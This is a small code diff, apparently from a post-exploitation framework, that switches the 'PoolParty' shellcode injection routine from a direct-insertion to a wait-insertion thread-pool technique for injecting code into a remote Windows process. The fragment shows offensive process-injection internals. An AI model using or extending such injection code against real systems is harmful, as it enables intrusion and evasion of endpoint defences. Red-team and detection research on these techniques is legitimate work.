@@ -570,7 +570,7 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 				BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: Cannot write custom shellcode!", ERROR_POOLPARTY_GENERIC);
 			}
 
-			if (remote_tp_direct_insertion(hProcess, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent) == ERROR_SUCCESS) {
+			if (remote_tp_wait_insertion(hProcess, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent) == ERROR_SUCCESS) {
 				dprintf("[INJECT] inject_via_poolparty: injectied!");
 			}
 			else {
